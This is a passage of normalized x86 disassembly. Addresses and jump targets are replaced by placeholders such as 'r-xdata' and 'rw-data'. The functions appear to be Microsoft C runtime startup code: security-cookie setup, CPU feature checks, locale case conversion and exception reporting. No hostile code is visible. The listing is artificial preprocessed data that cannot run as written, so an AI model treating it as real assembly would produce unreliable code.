mov esp [ ebp - 0x18 ]
call sub_4150e1
test al al
jne r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
push [ ebp - 0x20 ]
call sub_4151bc
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40e2e6
retn
call sub_41519e
sub_40dce8
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_40dcc0
mov esp ebp
pop ebp
retn
push 0x2
pop ecx
int 0x29
sub_40ddef
push ebp
mov ebp esp
sub esp 0x31c
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x31c ]
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ eax + rw-data ] ecx
push r--data
call sub_40dcc0
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
int 0x29
sub_40df25
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
call sub_410a10
test [ ebp + 0x8 ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0xc
push esi
call sub_40d57b
pop ecx
pop ecx
sub_40df6f
push ebp
mov ebp esp
and [ rw-data ] 0x0
sub esp 0x2c
push ebx
xor ebx ebx
inc ebx
or [ rw-data ] ebx
push 0xa
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
and [ ebp - 0x14 ] 0x0
xor eax eax
or [ rw-data ] 0x2
xor ecx ecx
push esi
push edi
mov [ rw-data ] ebx
lea edi [ ebp - 0x2c ]
push ebx
cpuid
mov esi ebx
pop ebx
mov [ edi ] eax
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
xor ecx 0x49656e69
mov eax [ ebp - 0x24 ]
xor eax 0x6c65746e
or ecx eax
mov eax [ ebp - 0x28 ]
xor eax 0x756e6547
or ecx eax
neg ecx
push 0x1
pop eax
sbb cl cl
push 0x0
add cl 0x1
pop ecx
push ebx
cpuid
mov esi ebx
pop ebx
mov [ edi ] eax
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
je r-xdata
mov edi [ rw-data ]
mov eax [ ebp - 0x2c ]
and eax 0xfff3ff0
cmp eax 0x106c0
je r-xdata
pop edi
pop esi
test eax 0x100000
je r-xdata
push 0x7
pop eax
xor ecx ecx
push ebx
cpuid
mov esi ebx
pop ebx
lea ebx [ ebp - 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] edx
mov eax [ ebp - 0x28 ]
test eax 0x200
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
je r-xdata
mov edi [ rw-data ]
or edi 0x1
mov [ rw-data ] edi
jmp r-xdata
cmp eax 0x20660
je r-xdata
or [ rw-data ] 0x4
mov [ rw-data ] 0x2
test eax 0x8000000
je r-xdata
or edi 0x2
mov [ rw-data ] edi
cmp [ ebp - 0xc ] 0x7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x18 ] eax
jl r-xdata
cmp eax 0x20670
je r-xdata
test eax 0x10000000
je r-xdata
cmp eax 0x30650
je r-xdata
xor ecx ecx
xgetbv
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
and eax 0x6
xor ecx ecx
cmp eax 0x6
jne r-xdata
cmp eax 0x30660
je r-xdata
test ecx ecx
jne r-xdata
cmp eax 0x30670
jne r-xdata
mov eax [ rw-data ]
or eax 0x8
mov [ rw-data ] 0x3
test [ ebp - 0x14 ] 0x20
mov [ rw-data ] eax
je r-xdata
or eax 0x20
mov [ rw-data ] 0x5
mov [ rw-data ] eax
sub_40e120
push ebp
mov ebp esp
sub esp 0x324
push ebx
push esi
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
xor esi esi
lea eax [ ebp - 0x324 ]
push 0x2cc
push esi
push eax
mov [ rw-data ] esi
call sub_411230
add esp 0xc
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x278 ] ecx
mov [ ebp - 0x27c ] edx
mov [ ebp - 0x280 ] ebx
mov [ ebp - 0x284 ] esi
mov [ ebp - 0x288 ] edi
mov [ ebp - 0x25c ] ss
mov [ ebp - 0x268 ] cs
mov [ ebp - 0x28c ] ds
mov [ ebp - 0x290 ] es
mov [ ebp - 0x294 ] fs
mov [ ebp - 0x298 ] gs
pushfd
pop [ ebp - 0x264 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x26c ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x324 ] 0x10001
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x270 ] eax
lea eax [ ebp - 0x58 ]
push esi
push eax
call sub_411230
mov eax [ ebp + 0x4 ]
add esp 0xc
mov [ ebp - 0x58 ] 0x40000015
mov [ ebp - 0x54 ] 0x1
mov [ ebp - 0x4c ] eax
call [ IsDebuggerPresent@IAT ]
push esi
lea ebx [ eax - 0x1 ]
neg ebx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x324 ]
sbb bl bl
mov [ ebp - 0x4 ] eax
inc bl
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
int 0x29
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bl
neg eax
sbb eax eax
and [ rw-data ] eax
sub_40e247
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_4190e7
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
je r-xdata
sub_40e2a0
push sub_410b00
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax

sub_40e2fb
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
mov eax [ rw-data ]
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x14 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_40e405
push ebx
push esi
mov esi r--data
mov ebx r--data
cmp esi ebx
jae r-xdata
pop esi
pop ebx
retn
push edi
add esi 0x4
cmp esi ebx
jb r-xdata
mov ecx edi
call j_sub_401f50
call edi
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_40e430
push ebx
push esi
mov esi r--data
mov ebx r--data
cmp esi ebx
jae r-xdata
pop esi
pop ebx
retn
push edi
add esi 0x4
cmp esi ebx
jb r-xdata
mov ecx edi
call j_sub_401f50
call edi
mov edi [ esi ]
test edi edi
je r-xdata
pop edi
sub_40e476
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] esi
call sub_407820
mov [ esi ] r--data
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40e4cd
push ebp
mov ebp esp
push ecx
push esi
push [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x4 ] esi
call sub_407820
mov [ esi ] r--data
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40e54b
xor eax eax
push edi
mov edi ecx
inc eax
[ rw-data ] eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_40edf8
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_40e578
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
test eax eax
jne r-xdata
cmp eax 0x8
jge r-xdata
call sub_419222
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_40ee0f
pop ecx
sub_40e5a9
or eax 0xffffffff
[ rw-data ] eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_40edea
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_40e5d0
mov eax [ ecx ]
test eax eax
je r-xdata
push 0x4
call sub_41920b
pop ecx
retn
cmp eax 0x8
jge r-xdata
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_40ee1d
pop ecx
sub_40e5ef
push ebp
mov ebp esp
push ecx
mov al [ ebp + 0x8 ]
xor edx edx
push esi
mov esi ecx
push r--data
mov [ ebp - 0x4 ] esi
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] edx
mov [ esi + 0x10 ] edx
mov [ esi + 0x14 ] al
mov [ ecx ] edx
mov [ ecx + 0x4 ] dl
call sub_40e713
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40e632
push ebp
mov ebp esp
push 0xffffffff
push sub_42acdb
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ecx + 0x4 ]
mov eax [ edi ]
mov esi [ eax + 0x8 ]
mov ecx esi
call j_sub_401f50
mov ecx edi
call esi
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push 0x1
mov esi [ ecx ]
mov ecx esi
call j_sub_401f50
mov ecx edi
call esi
sub_40e691
push esi
jmp r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov ecx esi
mov [ rw-data ] eax
call sub_40e632
push 0x8
push esi
call sub_40d57b
pop ecx
pop ecx
pop esi
retn
sub_40e6b8
push ebp
mov ebp esp
push 0xffffffff
push sub_42a560
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push esi
mov [ esi ] r--data
call sub_40e84b
cmp [ esi + 0x18 ] 0x0
pop ecx
je r-xdata
and [ esi + 0x18 ] 0x0
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi + 0x18 ]
call j_sub_41a3a5#2
pop ecx
sub_40e713
push ebp
mov ebp esp
push ebx
mov ebx ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ ebx ] edi
je r-xdata
pop edi
mov eax ebx
pop ebx
pop ebp
retn 0x4
cmp [ ebx ] 0x0
je r-xdata
and [ ebx ] 0x0
test edi edi
je r-xdata
push [ ebx ]
call j_sub_41a3a5#2
pop ecx
cmp [ edi ] 0x0
push esi
mov esi edi
je r-xdata
sub esi edi
inc esi
push esi
call sub_413b61
mov [ ebx ] eax
pop ecx
test eax eax
je r-xdata
inc esi
cmp [ esi ] 0x0
jne r-xdata
pop esi
push esi
push edi
push eax
call sub_4117a0
add esp 0xc
sub_40e767
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40e6b8
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x20
push esi
call sub_40d57b
pop ecx
pop ecx
sub_40e789
push ebp
mov ebp esp
push ecx
push 0x8
call sub_40d5ac
mov [ ebp - 0x4 ] eax
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
mov esp ebp
pop ebp
retn
sub_40e7bd
push 0x8
mov eax sub_42acfe
call sub_429751
xor esi esi
lea ecx [ ebp - 0x10 ]
push esi
call sub_40e578
mov edi [ rw-data ]
mov [ ebp - 0x4 ] esi
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push esi
call sub_40e92d
mov edi eax
push edi
call sub_40e952
pop ecx
pop ecx
push r--data
lea ecx [ edi + 0x18 ]
mov [ edi + 0x10 ] 0x3f
call sub_40e713
mov [ rw-data ] edi
mov eax [ edi ]
mov esi [ eax + 0x4 ]
mov ecx esi
call j_sub_401f50
mov ecx edi
call esi
mov eax [ rw-data ]
mov [ rw-data ] eax
lea ecx [ ebp - 0x10 ]
call sub_40e5d0
mov eax edi
call sub_42973c
retn
mov eax [ edi ]
mov esi [ eax + 0x4 ]
mov ecx esi
call j_sub_401f50
mov ecx edi
call esi
sub_40e84b
push 0x8
mov eax sub_42ad21
call sub_429751
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_40e578
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov edi [ ebx + 0xc ]
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ ebx + 0x8 ]
dec edi
mov eax [ eax + edi * 4 ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push [ ebx + 0x8 ]
call j_sub_41a3a5#2
pop ecx
lea ecx [ ebp - 0x14 ]
call sub_40e5d0
call sub_42973c
retn
mov eax [ eax ]
mov esi [ eax + 0x8 ]
mov ecx esi
call j_sub_401f50
mov ecx [ ebp - 0x10 ]
call esi
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
mov ecx [ eax ]
push 0x1
mov esi [ ecx ]
mov ecx esi
call j_sub_401f50
mov ecx [ ebp - 0x10 ]
call esi
sub_40e8c0
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_4192d1
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x24 ]
call sub_40e713
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_4192d1
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x2c ]
call sub_40e713
pop esi
pop ebp
retn
sub_40e90b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ebp
retn
mov ecx [ eax + 0x24 ]
test ecx ecx
jne r-xdata
push ecx
push 0x0
call sub_4192d1
pop ecx
pop ecx
lea ecx [ eax + 0x28 ]
sub_40e92d
push ebp
mov ebp esp
push ecx
push 0x20
call sub_40d5ac
mov [ ebp - 0x4 ] eax
pop ecx
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx eax
call sub_40e5ef
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_40e97a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push edi
mov edi [ eax ]
test edi edi
je r-xdata
pop edi
pop ebp
retn
mov eax [ edi ]
push esi
mov esi [ eax + 0x8 ]
mov ecx esi
call j_sub_401f50
mov ecx edi
call esi
mov edi eax
test edi edi
je r-xdata
pop esi
mov ecx [ edi ]
push 0x1
mov esi [ ecx ]
mov ecx esi
call j_sub_401f50
mov ecx edi
call esi
sub_40e9b3
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_40e578
push rw-data
call sub_40e97a
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_40e5d0
mov esp ebp
pop ebp
retn
sub_40e9df
push ebp
mov ebp esp
push ebx
call sub_419641
mov ebx [ ebp + 0x8 ]
push 0x2
push 0x100
mov [ ebx ] eax
call sub_41942e
mov [ ebx + 0x4 ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41948b
and [ ebx + 0x8 ] 0x0
mov [ ebx + 0x4 ] eax
push esi
push edi
call sub_41948b
mov edi [ ebx + 0x4 ]
mov ecx 0x80
mov esi eax
mov [ ebx + 0x8 ] 0x1
[ edi ] [ esi ]
pop edi
pop esi
jmp r-xdata
mov eax ebx
pop ebx
pop ebp
retn
push eax
call sub_4195e0
pop ecx
mov [ ebx + 0xc ] eax
call sub_419668
mov eax [ eax + 0x4 ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
sub_40ea4a
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
jne r-xdata
mov edi [ esi + 0xc ]
mov eax [ esi ]
call sub_419668
mov edi [ eax + 0x8 ]
call sub_419641
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov [ ebp - 0xc ] eax
test edi edi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
add eax 0x20
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edx ebx
sar edx 0x8
movzx ecx dl
movsx eax [ eax + ecx * 2 ]
shr eax 0xf
and eax 0x1
mov eax ebx
sar eax 0x8
mov [ ebp - 0x10 ] eax
call sub_41948b
mov edx [ ebp - 0x10 ]
movzx ecx dl
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x4 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_4195b3
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc eax
push 0x2
mov [ ebp - 0x4 ] dl
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
push 0x1
push [ ebp - 0xc ]
lea ecx [ ebp - 0x8 ]
push 0x3
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x100
push edi
call sub_40eebd
add esp 0x20
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
sub_40eb44
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
jne r-xdata
mov edi [ esi + 0xc ]
mov eax [ esi ]
call sub_419668
mov edi [ eax + 0x8 ]
call sub_419641
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
mov [ ebp - 0xc ] eax
test edi edi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub eax 0x20
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edx ebx
sar edx 0x8
movzx ecx dl
movsx eax [ eax + ecx * 2 ]
shr eax 0xf
and eax 0x1
mov eax ebx
sar eax 0x8
mov [ ebp - 0x10 ] eax
call sub_41948b
mov edx [ ebp - 0x10 ]
movzx ecx dl
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x4 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_419586
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc eax
push 0x2
mov [ ebp - 0x4 ] dl
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
push 0x1
push [ ebp - 0xc ]
lea ecx [ ebp - 0x8 ]
push 0x3
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x200
push edi
call sub_40eebd
add esp 0x20
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
sub_40ec3e
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax r--data
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp eax r--data
jne r-xdata
cmp [ eax ] ecx
je r-xdata
mov eax r--data
pop ebp
retn
sub_40ec63
push ebp
mov ebp esp
push ebx
mov ebx ecx
push edi
mov edi [ ebx + 0x2c ]
test edi edi
je r-xdata
pop edi
pop ebx
pop ebp
retn 0x4
push esi
push [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov ecx esi
push ebx
push [ ebp + 0x8 ]
call j_sub_401f50
call esi
mov edi [ edi ]
add esp 0xc
test edi edi
jne r-xdata
pop esi
sub_40ec95
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx esi
call sub_40ecd5
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
dec [ eax + rw-data ]
mov al [ eax + rw-data ]
test al al
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_407b40
push 0x8
push esi
call sub_40d57b
pop ecx
pop ecx
sub_40ecd5
push esi
push edi
push 0x0
mov edi ecx
call sub_40ec63
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
and [ edi + 0x28 ] 0x0
mov eax [ edi + 0x2c ]
test eax eax
je r-xdata
mov esi [ eax ]
push 0x10
push eax
call sub_40d57b
mov eax esi
pop ecx
pop ecx
test esi esi
jne r-xdata
and [ edi + 0x2c ] 0x0
pop edi
pop esi
retn
mov esi [ eax ]
push 0xc
push eax
call sub_40d57b
mov eax esi
pop ecx
pop ecx
test esi esi
jne r-xdata
sub_40ed1d
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor ecx ecx
push esi
push edi
mov edi eax
mov edx eax
and edi 0x4
and edx 0x80
inc ecx
test al 0x40
je r-xdata
test al 0x8
je r-xdata
or eax ecx
and eax 0xffffff3b
xor esi esi
or eax 0x2
cmp [ esi * 4 + r--data ] 0x0
jne r-xdata
mov ecx [ esi * 4 + r--data ]
inc esi
test ecx ecx
jne r-xdata
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
cmp ecx eax
je r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_40edc8
mov esi eax
add esp 0xc
test esi esi
je r-xdata
test al 0xa
je r-xdata
pop edi
pop esi
pop ebp
retn
test edi edi
je r-xdata
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x8 ]
call sub_40edc8
add esp 0xc
test eax eax
je r-xdata
mov eax esi
push 0x2
push 0x0
push esi
call sub_41682b
add esp 0xc
test eax eax
je r-xdata
push eax
push esi
jmp r-xdata
call sub_416d39
pop ecx
jmp r-xdata
sub_40ee2b
push ebp
mov ebp esp
push 0xffffffff
push sub_42a560
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx 0xa
jb r-xdata
mov eax [ ecx * 4 + rw-data ]
inc ecx
push eax
mov [ rw-data ] ecx
call [ DecodePointer@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call j_sub_401f50
call esi
sub_40ee8f
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je sub_419afb
push [ ebp + 0x8 ]
dec eax
mov [ rw-data ] eax
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
sub_40eebd
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
test esi esi
jle r-xdata
xor eax eax
xor edi edi
cmp [ ebp + 0x24 ] eax
push edi
push edi
push esi
push [ ebp + 0x10 ]
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
push esi
push [ ebp + 0x10 ]
call sub_41a389
pop ecx
cmp eax esi
pop ecx
lea esi [ eax + 0x1 ]
jl r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
lea edx [ eax + eax ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
mov esi eax
mov ebx edi
mov [ ebp - 0x8 ] edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi edi
push [ ebp - 0xc ]
push ebx
push esi
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_419b3e
mov ebx eax
mov [ ebp - 0x8 ] ebx
pop ecx
test ebx ebx
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_4297c0
mov ebx esp
mov [ ebp - 0x8 ] ebx
test ebx ebx
je r-xdata
push edi
push edi
push [ ebp - 0xc ]
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f543
mov esi eax
add esp 0x18
test esi esi
je r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
mov [ ebp - 0x8 ] ebx
jmp r-xdata
lea edx [ esi + esi ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
mov ebx edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
